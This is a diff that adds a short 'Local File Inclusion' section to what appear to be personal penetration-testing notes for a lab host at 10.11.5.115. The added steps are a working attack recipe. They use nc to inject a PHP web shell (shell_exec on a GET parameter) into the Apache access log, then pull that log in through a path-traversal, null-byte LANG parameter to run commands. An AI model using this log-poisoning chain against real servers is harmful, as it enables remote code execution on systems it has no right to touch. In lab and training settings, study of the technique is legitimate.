@@ -66,3 +66,12 @@ XSS can be leveraged to do many things but as an example...
 Might be turned off in php.ini file look for `allow_url_fopen` and `allow_url_include`
 
 ##Local File Inclusion
+Even with remote file includes turned off it's still possible to run local files and it may be possible to posion log files in order to run php of our choosing.
+
+1. Connect to the webserver using nc `nc -nv 10.11.5.115 80` and paste `<?php echo shell_exec($_GET['cmd']); ?>`
+
+2. Check the access log  on your victims machine to confirm you have posioned the log file 
+
+3. We can now attempt to include the log by navigating to
+
+    `http://10.11.5.115/addguestbook.php?name=hacker&comment=test&cmd=ipconfig&LANG=../../../../../../../xampp/apache/logs/access.log%00&Submit=Submit`
